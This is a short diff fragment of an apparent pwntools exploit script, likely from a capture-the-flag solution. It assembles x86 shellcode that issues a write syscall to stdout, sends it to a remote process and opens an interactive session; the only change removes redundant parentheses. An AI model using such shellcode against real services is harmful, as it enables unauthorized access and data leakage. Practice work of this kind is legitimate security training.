@@ -122,7 +122,7 @@ shellcode += asm("mov eax, 0x04") #eax mode = 4, write(4)
 shellcode += asm("mov ebx, 0x01") #ebx-fd: stdout(1)
 shellcode += asm("int 0x80") #syscall
 print(shellcode)
-r.sendline((shellcode))
+r.sendline(shellcode)
 
 r.interactive()
 ```
